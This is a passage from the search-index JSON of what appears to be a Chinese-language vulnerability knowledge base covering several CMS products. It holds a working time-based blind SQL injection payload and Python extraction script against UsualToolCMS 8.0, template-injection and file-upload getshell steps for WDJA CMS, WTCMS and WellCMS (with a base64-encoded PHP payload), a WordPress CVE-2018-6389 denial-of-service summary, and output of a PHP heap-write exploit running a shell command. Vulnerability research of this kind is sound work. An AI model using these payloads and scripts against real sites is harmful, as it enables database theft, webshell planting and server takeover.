sql\u6ce8\u2f0a\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/#0x01","text":"\u7248\u672c\u4fe1\u606f\uff1aUsualToolCMS-8.0-Release \u7248\u672c\u4e0b\u8f7d\uff1a http://www.a5xiazai.com/php/140604.html \u5b98\u7f51\u4e0b\u8f7d\uff1a https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip","title":"0x01 \u6f0f\u6d1e\u73af\u5883"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/#0x02","text":"\u5728./cmsadmin/a_templetex.php\u6587\u4ef6\u7b2c137\u884c\uff0cpaths\u53d8\u91cf\u6ca1\u6709\u8fc7\u6ee4\uff0c136\u884c\u4eceget\u5904\u83b7\u53d6paths\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4: \u5f53\u4eceget\u5904\u83b7\u5f97\u7684t\u7b49\u4e8eopen\u65f6\u5c31\u53ef\u4ee5\u51fa\u53d1\u8fd9\u4e2asql\u6ce8\u5165\uff0c\u5728\u6587\u4ef6\u7b2c129\u884c: \u6784\u9020payload\uff1a Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+ \u7531\u4e8e\u662f\u65f6\u95f4\u76f2\u6ce8\uff0c\u7f16\u5199\u5ef6\u8fdf\u6ce8\u5165\u811a\u672c: Copy# -*- coding:utf-8 -*- import time import requests session = requests.session() headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0'} img_url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/class/UsualToolCMS_Code.php?r=13720' img_req = session.get(url=img_url,headers=headers).content with open('pic.png','wb') as f: f.write(img_req) code = input('\u8bf7\u8f93\u5165\u9a8c\u8bc1\u7801\uff1a') data = { 'uuser':'admin', 'upass':'admin', 'ucode':code } payloads = list('root@localhostasfafsasf') url = 'http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login' response = session.post(url=url,headers=headers,data=data) res_url_1 = \"http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),{},1))={},sleep(5),1)--+\" result = '' for i in range(1,15): for payload in payloads: res_url_2 = res_url_1.format(str(i),ord(payload)) start_time = time.time() response = session.get(url=res_url_2,headers=headers) if time.time() - start_time > 7: result = result + payload print(result) break \u7206\u6570\u636e\u5e93\u8868payload\uff1a Copya_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>0,sleep(5),1)--+ ----------------------------------------------------------------------------","title":"0x02 \u6f0f\u6d1e\u5206\u6790"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WDJACMS/WDJACMS1.5.2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"WDJA CMS 1.5.2\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u53d1\u6398\u5206\u6790 \u524d\u8a00 \u8fd9\u662f\u5e74\u521d\u65e0\u804a\u5728\u5bb6\u5ba1\u7684\u4e00\u4e2a\u5c0f\u4f17\u7684CMS\uff0c\u6f0f\u6d1e\u5b98\u65b9\u5df2\u7ecf\u4fee\u590d\uff0c\u73b0\u5728\u5206\u4eab\u51fa\u6765\u7ed9\u5927\u5bb6\uff0c\u5e0c\u671b\u4e00\u8d77\u5171\u540c\u5b66\u4e60\u548c\u8fdb\u6b65\u3002 \u4ee3\u7801\u5ba1\u8ba1 \u6f0f\u6d1e\u6587\u4ef6\uff1a\\common\\incfiles\\function.inc.php \u5168\u5c40\u641c\u7d22\u4e2d\u53d1\u73b0\u8fd9\u4e2acms\u7684\u6a21\u677f\u5f15\u64ce\u662f\u4f7f\u7528eval\u6765\u5b9e\u73b0\u7684\u3002 \u6211\u4eec \u8ddf\u8fdb ii_eval() \u51fd\u6570\u3002\u975e\u5e38\u8fd9\u91cc $strers \u53ef\u63a7\u7591\u4f3c\u5b58\u5728\u4ee3\u7801\u6267\u884c\u3002\u6211\u4eec\u5728\u7ee7\u7eed\u8ddf\u8fdb ii_eval() \u770b\u8c01\u8c03\u7528\u4e86\u4ed6\u3002 \u6f0f\u6d1e\u6587\u4ef6\uff1a\\common\\incfiles\\function.inc.php \u53ea\u6709\u4e00\u4e2a\u5730\u65b9\u5bf9\u4ed6\u8fdb\u884c\u4e86\u8c03\u7528\uff0c\u4ed6\u662f ii_creplace() \u51fd\u6570 \u6211\u4eec\u770b ii_creplace() \u4ee3\u7801\uff0c $strers \u53ef\u63a7\uff0c\u4f46\u662f\u5b83\u5fc5\u987b\u5339\u914d ({\\$=(.[^\\}]*)}) \u8fd9\u4e2a\u6b63\u5219\u7c7b\u4f3c\u4e8e\u4e0b\u9762\uff1a {$=phpinfo()} \u6f0f\u6d1e\u6587\u4ef6passport\\address\\common\\incfiles\\manage_config.inc.php \u90a3\u4e48\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb ii_creplace() \u51fd\u6570\u770b\u8c01\u5bf9\u4ed6\u8fdb\u884c\u4e86\u8c03\u7528\uff0c\u627e\u4e86\u5f88\u591a\u4f46\u662f\u90fd\u5bf9\u51fd\u6570\u4e2d\u7684 $ \u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u4f46\u662f\u5728 passport\\address\\common\\incfiles\\manage_config.inc.php \u4e2d\u7684 wdja_cms_admin_manage_list() \u5e76\u672a\u505a\u4efb\u4f55\u8fc7\u6ee4\u3002\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb\u3002 \u6211\u4eec\u53d1\u73b0 \\passport\\address\\manage.php \u5bf9 passport\\address\\common\\incfiles\\manage_config.inc.php \u8fdb\u884c\u4e86\u5305\u542b\u5e76\u8c03\u7528\u4e86 wdja_cms_admin_manage_action() ,\u800c\u5b83\u8c03\u7528\u4e86 wdja_cms_admin_manage_list() ,\u90a3\u4e48\u5f88\u660e\u663e\u6211\u4eec\u53ea\u9700\u5c06\u7b26\u5408 {\\$=(.[^\\}]*)} \u6b63\u5219\u7684payload\u4f20\u5165\u5373\u53ef\u5bfc\u81f4getshell. \u90a3\u4e48\u4ece\u54ea\u4f20\u5165\u5462\uff0c\u6211\u4eec\u76f4\u63a5\u628a wdja_cms_admin_manage_list() \u4e2d\u7684sql\u8bed\u53e5\u6253\u5370\u51fa\u6765\u5373\u53ef\u77e5\u9053\u3002 \u5f88\u660e\u663e\u662f\u4ece\u7528\u6237\u5730\u5740\u4e2d\u83b7\u53d6\u3002 Getshell \u5148\u6ce8\u518c\u4e00\u4e2a\u4f1a\u5458 http://www.\u57df\u540d.com/passport/?type=register \u5728\u6dfb\u52a0\u5730\u5740\u51fa\u5199\u5165\u8981\u6ce8\u5165\u7684\u547d\u4ee4,\u786e\u8ba4\u6dfb\u52a0\u5730\u5740\u5373\u53ef\u3002 http://www.\u57df\u540d.com/passport/address/index.php?type=list getshell exp,\u540c\u6837\u65b9\u6cd5\u5728\u5730\u5740\u51fa\u5199\u5165\u4e0b\u9762\u4ee3\u7801\u5373\u53ef\u5728 passport\\address \u8def\u5f84\u4e0b\u751f\u6210\u4e00\u4e2ashell.php \u672c\u4e3b\u9898\u7531 \u6751\u957fCZ \u4e8e 2020-11-17 18:53 \u6dfb\u52a0\u56fe\u7ae0 100\u5143\u5956\u91d1","title":"WDJACMS1.5.2\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u00b6 1\u3001\u767b\u5f55\u540e\u53f0\u540e\uff0c\u8fdb\u5165\u6ce8\u518c\u90ae\u4ef6\u6a21\u677f\u529f\u80fd 2\u3001\u4f7f\u7528\u7f16\u8f91\u5668\u4e0a\u4f20\u4e00\u5f20\u56fe\u7247\uff0c\u5e76\u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d\u53ca\u6587\u4ef6\u5185\u5bb9 3\u3001\u8bbf\u95ee\u4e0a\u4f20\u7684php\u6587\u4ef6 \u53c2\u8003\u94fe\u63a5 \u00b6 https://xz.aliyun.com/t/4234","title":"\u6587\u4ef6\u4e0a\u4f20getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","text":"1\u3001\u767b\u5f55\u540e\u53f0\u540e\uff0c\u8fdb\u5165\u6ce8\u518c\u90ae\u4ef6\u6a21\u677f\u529f\u80fd 2\u3001\u4f7f\u7528\u7f16\u8f91\u5668\u4e0a\u4f20\u4e00\u5f20\u56fe\u7247\uff0c\u5e76\u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d\u53ca\u6587\u4ef6\u5185\u5bb9 3\u3001\u8bbf\u95ee\u4e0a\u4f20\u7684php\u6587\u4ef6","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WTCMS/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","text":"https://xz.aliyun.com/t/4234","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"WellCMS \u00b6 WellCMS\u662f\u4e00\u6b3e\u5f00\u6e90\u3001\u503e\u5411\u79fb\u52a8\u7aef\u7684\u8f7b\u91cf\u7ea7CMS\uff0c\u9ad8\u8d1f\u8f7dCMS\uff0c\u4ebf\u4e07\u7ea7CMS\uff0c\u662f\u5927\u6570\u636e\u91cf\u3001\u9ad8\u5e76\u53d1\u8bbf\u95ee\u7f51\u7ad9\u6700\u4f73\u9009\u62e9\u7684\u8f7bCMS\u3002\u767b\u9646\u8be5CMS\u540e\u53f0\uff0c\u67d0\u56fe\u7247\u4e0a\u4f20\u5904\uff0c\u7531\u4e8e\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\u53ef\u63a7\uff0c\u53ef\u4fee\u6539\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\u83b7\u53d6webshell\u3002 \u590d\u73b0\u8fc7\u7a0b \u00b6 \u7b2c\u4e00\u6b65\uff0c\u767b\u9646\u8be5CMS\u540e\u53f0\uff1a \u7b2c\u4e8c\u6b65\uff0c\u8fdb\u5165\u201c\u540e\u53f0\u7ba1\u7406\u201c\uff0c\u5b9a\u4f4d\u5229\u7528\u70b9\uff0c\u70b9\u51fb\u4e0b\u56fe\u7ea2\u6846\u4e2d\u56fe\u7247\u8fdb\u884c\u4e0a\u4f20\uff1a \u4e0a\u4f20\u5e76\u6293\u53d6\u6570\u636e\u5305\uff1a \u7b2c\u4e09\u6b65\uff0c\u4fee\u6539post\u5305\u4e2d\u201cfiletype\u201d\u53c2\u6570\u7c7b\u578b\u4e3a\u201cphp\u201d\uff1b\u7ecf\u5206\u6790 \u201cdata\u201d\u53c2\u6570\u4e3abase64\u52a0\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5c06\u6d4b\u8bd5\u6570\u636e\u201c<?php phpinfo();?>\u201d\u7ecf\u8fc7base64\u52a0\u5bc6\u7b49\u6784\u9020\uff0c\u5f62\u6210\u201cdata\u201d\u53c2\u6570\u7684\u6570\u636e\uff1adata%3Aimage%2Fjpeg%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B\uff0c\u6700\u540e\u6570\u636e\u5305\u653e\u884c\uff0c\u8fd4\u56de\u6210\u529f\u4e0a\u4f20\u4e3aphp\u6587\u4ef6\u7684\u8def\u5f84\uff1a \u6700\u540e\uff0c\u5c1d\u8bd5\u8bbf\u95ee\uff0c\u6210\u529f\uff1a \u6e90\u7801\u5206\u6790 \u00b6 \u6839\u636e\u6f0f\u6d1e\u5b9a\u4f4d\u4ee3\u7801\u6587\u4ef6\uff1aroute/attach.php\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a if ($action == 'create') { // hook attach_create_start.php user_login_check(); // hook attach_create_check_after.php $backstage = param(2, 0); $width = param('width', 0); $height = param('height', 0); $is_image = param('is_image', 0); // \u56fe\u7247 $name = param('name'); $data = param_base64('data'); $mode = param('mode', 0); // \u4e0a\u4f20\u7c7b\u578b 1\u4e3b\u56fe $filetype = param('filetype'); // \u538b\u7f29\u56fe\u7247\u540e\u7f00jpeg jpg png\u7b49 $convert = param('convert', 0); // \u56fe\u7247\u8f6c\u6362\u538b\u7f29 = 1 $n = param('n', 0); // \u5bf9\u5e94\u4e3b\u56fe\u8d4b\u503c $type = param('type', 0); // type = 0\u5219\u6309\u7167SESSION\u6570\u7ec4\u9644\u4ef6\u6570\u91cf\u7edf\u8ba1\uff0ctype = 1\u5219\u6309\u7167\u4f20\u5165\u7684n\u6570\u503c // hook attach_create_before.php // \u5141\u8bb8\u7684\u6587\u4ef6\u540e\u7f00\u540d //$types = include _include(APP_PATH.'conf/attach.conf.php'); //$allowtypes = $types['all']; empty($group['allowattach']) AND $gid != 1 AND message(2, '\u60a8\u65e0\u6743\u4e0a\u4f20'); // hook attach_create_center.php empty($data) AND message(1, lang('data_is_empty')); //$data = base64_decode_file_data($data); $size = strlen($data); $size > 20480000 AND message(1, lang('filesize_too_large', array('maxsize' => '20M', 'size' => $size))); // hook attach_create_file_ext_start.php // \u83b7\u53d6\u6587\u4ef6\u540e\u7f00\u540d 111.php.shtmll $ext = file_ext($name, 7); $filetypes = include APP_PATH . 'conf/attach.conf.php'; // hook attach_create_file_ext_before.php //\u4e3b\u56fe\u5fc5\u987b\u4e3a\u56fe\u7247 if ($is_image == 1 && $mode == 1 && !in_array($ext, $filetypes['image'])) message(1, lang('well_up_picture_error')); // hook attach_create_file_ext_center.php // \u5982\u679c\u6587\u4ef6\u540e\u7f00\u4e0d\u5728\u89c4\u5b9a\u8303\u56f4\u5185 \u6539\u53d8\u540e\u7f00\u540d //!in_array($ext, $filetypes['all']) AND $ext = '_' . $ext; if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS\u4e0a\u4f20\u56fe\u7247 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } // hook attach_create_file_ext_after.php $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed')); // hook attach_create_save_after.php // \u4fdd\u5b58\u5230 session\uff0c\u53d1\u5e16\u6210\u529f\u4ee5\u540e\uff0c\u5173\u8054\u5230\u5e16\u5b50\u3002 // save attach information to session, associate to post after create thread. // \u629b\u5f03\u4e4b\u524d\u7684 $_SESSION \u6570\u636e\uff0c\u91cd\u65b0\u542f\u52a8 session\uff0c\u964d\u4f4e session \u5e76\u53d1\u5199\u5165\u7684\u95ee\u9898 // Discard the previous $_SESSION data, restart the session, reduce the problem of concurrent session write sess_restart(); empty($t) AND empty($_SESSION['tmp_files']) AND $_SESSION['tmp_files'] = array(); $t == 1 AND empty($_SESSION['tmp_website_files']) AND $_SESSION['tmp_website_files'] = array(); // hook attach_create_after.php // type = 0\u5219\u6309\u7167SESSION\u6570\u7ec4\u9644\u4ef6\u6570\u91cf\u7edf\u8ba1\uff0ctype = 1\u5219\u6309\u7167\u4f20\u5165\u7684n\u6570\u503c empty($type) AND $n = ($t == 1) ? count($_SESSION['tmp_website_files']) : count($_SESSION['tmp_files']); $filesize = filesize($tmpfile); $attach = array( 'backstage' => $backstage, // 0\u524d\u53f0 1\u540e\u53f0 'url' => $backstage ? '../' . $tmpurl : '' . $tmpurl, 'path' => $tmpfile, 'orgfilename' => $name, 'filetype' => $filetype, 'filesize' => $filesize, 'width' => $width, 'height' => $height, 'isimage' => $is_image, 'downloads' => 0, 'aid' => '_' . $n ); // hook attach_create_array_after.php if ($mode == 1) { // hook attach_create_thumbnail_beofre.php $_SESSION['tmp_thumbnail'] = $attach; // hook attach_create_thumbnail_after.php } else { // hook attach_create_website_files_beofre.php // 0 BBS 1 CMS $t == 1 ? $_SESSION['tmp_website_files'][$n] = $attach : $_SESSION['tmp_files'][$n] = $attach; // hook attach_create_website_files_after.php } // hook attach_create_session_after.php unset($attach['path']); // hook attach_create_end.php message(0, $attach); \u5927\u81f4\u6d41\u7a0b\uff1a 1\u3001 \u9996\u5148\uff0c\u63a5\u53d7\u76f8\u5173\u53c2\u6570\uff0c\u5c06filetype\u81ea\u884c\u8bbe\u7f6e\u6210\u201cphp\u201d\uff1a $data = param_base64('data'); $filetype = param('filetype'); / 2\u3001 \u8fdb\u884c\u903b\u8f91\u5224\u65ad\uff1a if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS\u4e0a\u4f20\u56fe\u7247 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } 3\u3001 \u6700\u540e\u6210\u529f\u5199\u5165\uff1a $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed'));","title":"WellCMS 2.0 Beta3 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#wellcms","text":"WellCMS\u662f\u4e00\u6b3e\u5f00\u6e90\u3001\u503e\u5411\u79fb\u52a8\u7aef\u7684\u8f7b\u91cf\u7ea7CMS\uff0c\u9ad8\u8d1f\u8f7dCMS\uff0c\u4ebf\u4e07\u7ea7CMS\uff0c\u662f\u5927\u6570\u636e\u91cf\u3001\u9ad8\u5e76\u53d1\u8bbf\u95ee\u7f51\u7ad9\u6700\u4f73\u9009\u62e9\u7684\u8f7bCMS\u3002\u767b\u9646\u8be5CMS\u540e\u53f0\uff0c\u67d0\u56fe\u7247\u4e0a\u4f20\u5904\uff0c\u7531\u4e8e\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\u53ef\u63a7\uff0c\u53ef\u4fee\u6539\u4e0a\u4f20\u6587\u4ef6\u7c7b\u578b\u83b7\u53d6webshell\u3002","title":"WellCMS"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_1","text":"\u7b2c\u4e00\u6b65\uff0c\u767b\u9646\u8be5CMS\u540e\u53f0\uff1a \u7b2c\u4e8c\u6b65\uff0c\u8fdb\u5165\u201c\u540e\u53f0\u7ba1\u7406\u201c\uff0c\u5b9a\u4f4d\u5229\u7528\u70b9\uff0c\u70b9\u51fb\u4e0b\u56fe\u7ea2\u6846\u4e2d\u56fe\u7247\u8fdb\u884c\u4e0a\u4f20\uff1a \u4e0a\u4f20\u5e76\u6293\u53d6\u6570\u636e\u5305\uff1a \u7b2c\u4e09\u6b65\uff0c\u4fee\u6539post\u5305\u4e2d\u201cfiletype\u201d\u53c2\u6570\u7c7b\u578b\u4e3a\u201cphp\u201d\uff1b\u7ecf\u5206\u6790 \u201cdata\u201d\u53c2\u6570\u4e3abase64\u52a0\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5c06\u6d4b\u8bd5\u6570\u636e\u201c<?php phpinfo();?>\u201d\u7ecf\u8fc7base64\u52a0\u5bc6\u7b49\u6784\u9020\uff0c\u5f62\u6210\u201cdata\u201d\u53c2\u6570\u7684\u6570\u636e\uff1adata%3Aimage%2Fjpeg%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B\uff0c\u6700\u540e\u6570\u636e\u5305\u653e\u884c\uff0c\u8fd4\u56de\u6210\u529f\u4e0a\u4f20\u4e3aphp\u6587\u4ef6\u7684\u8def\u5f84\uff1a \u6700\u540e\uff0c\u5c1d\u8bd5\u8bbf\u95ee\uff0c\u6210\u529f\uff1a","title":"\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_2","text":"\u6839\u636e\u6f0f\u6d1e\u5b9a\u4f4d\u4ee3\u7801\u6587\u4ef6\uff1aroute/attach.php\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a if ($action == 'create') { // hook attach_create_start.php user_login_check(); // hook attach_create_check_after.php $backstage = param(2, 0); $width = param('width', 0); $height = param('height', 0); $is_image = param('is_image', 0); // \u56fe\u7247 $name = param('name'); $data = param_base64('data'); $mode = param('mode', 0); // \u4e0a\u4f20\u7c7b\u578b 1\u4e3b\u56fe $filetype = param('filetype'); // \u538b\u7f29\u56fe\u7247\u540e\u7f00jpeg jpg png\u7b49 $convert = param('convert', 0); // \u56fe\u7247\u8f6c\u6362\u538b\u7f29 = 1 $n = param('n', 0); // \u5bf9\u5e94\u4e3b\u56fe\u8d4b\u503c $type = param('type', 0); // type = 0\u5219\u6309\u7167SESSION\u6570\u7ec4\u9644\u4ef6\u6570\u91cf\u7edf\u8ba1\uff0ctype = 1\u5219\u6309\u7167\u4f20\u5165\u7684n\u6570\u503c // hook attach_create_before.php // \u5141\u8bb8\u7684\u6587\u4ef6\u540e\u7f00\u540d //$types = include _include(APP_PATH.'conf/attach.conf.php'); //$allowtypes = $types['all']; empty($group['allowattach']) AND $gid != 1 AND message(2, '\u60a8\u65e0\u6743\u4e0a\u4f20'); // hook attach_create_center.php empty($data) AND message(1, lang('data_is_empty')); //$data = base64_decode_file_data($data); $size = strlen($data); $size > 20480000 AND message(1, lang('filesize_too_large', array('maxsize' => '20M', 'size' => $size))); // hook attach_create_file_ext_start.php // \u83b7\u53d6\u6587\u4ef6\u540e\u7f00\u540d 111.php.shtmll $ext = file_ext($name, 7); $filetypes = include APP_PATH . 'conf/attach.conf.php'; // hook attach_create_file_ext_before.php //\u4e3b\u56fe\u5fc5\u987b\u4e3a\u56fe\u7247 if ($is_image == 1 && $mode == 1 && !in_array($ext, $filetypes['image'])) message(1, lang('well_up_picture_error')); // hook attach_create_file_ext_center.php // \u5982\u679c\u6587\u4ef6\u540e\u7f00\u4e0d\u5728\u89c4\u5b9a\u8303\u56f4\u5185 \u6539\u53d8\u540e\u7f00\u540d //!in_array($ext, $filetypes['all']) AND $ext = '_' . $ext; if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS\u4e0a\u4f20\u56fe\u7247 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } // hook attach_create_file_ext_after.php $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed')); // hook attach_create_save_after.php // \u4fdd\u5b58\u5230 session\uff0c\u53d1\u5e16\u6210\u529f\u4ee5\u540e\uff0c\u5173\u8054\u5230\u5e16\u5b50\u3002 // save attach information to session, associate to post after create thread. // \u629b\u5f03\u4e4b\u524d\u7684 $_SESSION \u6570\u636e\uff0c\u91cd\u65b0\u542f\u52a8 session\uff0c\u964d\u4f4e session \u5e76\u53d1\u5199\u5165\u7684\u95ee\u9898 // Discard the previous $_SESSION data, restart the session, reduce the problem of concurrent session write sess_restart(); empty($t) AND empty($_SESSION['tmp_files']) AND $_SESSION['tmp_files'] = array(); $t == 1 AND empty($_SESSION['tmp_website_files']) AND $_SESSION['tmp_website_files'] = array(); // hook attach_create_after.php // type = 0\u5219\u6309\u7167SESSION\u6570\u7ec4\u9644\u4ef6\u6570\u91cf\u7edf\u8ba1\uff0ctype = 1\u5219\u6309\u7167\u4f20\u5165\u7684n\u6570\u503c empty($type) AND $n = ($t == 1) ? count($_SESSION['tmp_website_files']) : count($_SESSION['tmp_files']); $filesize = filesize($tmpfile); $attach = array( 'backstage' => $backstage, // 0\u524d\u53f0 1\u540e\u53f0 'url' => $backstage ? '../' . $tmpurl : '' . $tmpurl, 'path' => $tmpfile, 'orgfilename' => $name, 'filetype' => $filetype, 'filesize' => $filesize, 'width' => $width, 'height' => $height, 'isimage' => $is_image, 'downloads' => 0, 'aid' => '_' . $n ); // hook attach_create_array_after.php if ($mode == 1) { // hook attach_create_thumbnail_beofre.php $_SESSION['tmp_thumbnail'] = $attach; // hook attach_create_thumbnail_after.php } else { // hook attach_create_website_files_beofre.php // 0 BBS 1 CMS $t == 1 ? $_SESSION['tmp_website_files'][$n] = $attach : $_SESSION['tmp_files'][$n] = $attach; // hook attach_create_website_files_after.php } // hook attach_create_session_after.php unset($attach['path']); // hook attach_create_end.php message(0, $attach); \u5927\u81f4\u6d41\u7a0b\uff1a 1\u3001 \u9996\u5148\uff0c\u63a5\u53d7\u76f8\u5173\u53c2\u6570\uff0c\u5c06filetype\u81ea\u884c\u8bbe\u7f6e\u6210\u201cphp\u201d\uff1a $data = param_base64('data'); $filetype = param('filetype'); / 2\u3001 \u8fdb\u884c\u903b\u8f91\u5224\u65ad\uff1a if (!in_array($ext, $filetypes['all'])) { $ext = '_' . $ext; } else { // CMS\u4e0a\u4f20\u56fe\u7247 $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype; } 3\u3001 \u6700\u540e\u6210\u529f\u5199\u5165\uff1a $tmpanme = $uid . '_' . xn_rand(15) . '.' . $ext; // hook attach_create_tmpanme_after.php $tmpfile = $conf['upload_path'] . 'tmp/' . $tmpanme; // hook attach_create_tmpfile_after.php $tmpurl = $conf['upload_url'] . 'tmp/' . $tmpanme; // hook attach_create_tmpurl_after.php $filetype = attach_type($name, $filetypes); // hook attach_create_save_before.php file_put_contents($tmpfile, $data) OR message(1, lang('write_to_file_failed'));","title":"\u6e90\u7801\u5206\u6790"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/","text":"CVE-2018-6389 Wordpress Exploit \u00b6 CVE-2018-6389 Exploit Can Down Any Wordpress site under 4.9.3 The flaw affects the load-scripts.php WordPress script, it receives a parameter called load[] About PoC \u00b6 A simple Script In Python With threading could allow anyone to take down most WordPress websites with single machine \u811a\u672cgithub\u83b7\u53d6 Info \u00b6 Can Down Any Website with Tested Wordpress versions * Tested : WordPress (Version 4.9.2) * Tested : WordPress (Version 4.9.1) Note : I Am Not The Author Of the Exploit Ref \u00b6 PoC - Youtube Barak Tawily - Blog","title":"CVE-2018-6389 Wordpress Exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#cve-2018-6389-wordpress-exploit","text":"CVE-2018-6389 Exploit Can Down Any Wordpress site under 4.9.3 The flaw affects the load-scripts.php WordPress script, it receives a parameter called load[]","title":"CVE-2018-6389 Wordpress Exploit"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#about-poc","text":"A simple Script In Python With threading could allow anyone to take down most WordPress websites with single machine \u811a\u672cgithub\u83b7\u53d6","title":"About PoC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#info","text":"Can Down Any Website with Tested Wordpress versions * Tested : WordPress (Version 4.9.2) * Tested : WordPress (Version 4.9.1) Note : I Am Not The Author Of the Exploit","title":"Info"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/#ref","text":"PoC - Youtube Barak Tawily - Blog","title":"Ref"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/","text":"imagecolormatch() OOB Heap Write exploit \u00b6 Info \u00b6 My binary exploit for CVE-2019-6977 . Bug found by Simon Scannell from RIPS. PHP bug is here . Helps you bypass PHP's disable_functions INI directive. I commented a lot to help people that are new to binary PHP exploitation. Hope this helps. Output \u00b6 GET http://target.com/exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi Nenuphar.ce: 0x7fe834a10018 Nenuphar2.ce: 0x7fe834a10d70 Nenuphar.properties: 0x7fe834a01230 z.val: 0x7fe834aaea18 Difference: 0xad7e8 Exploit SUCCESSFUL ! From: 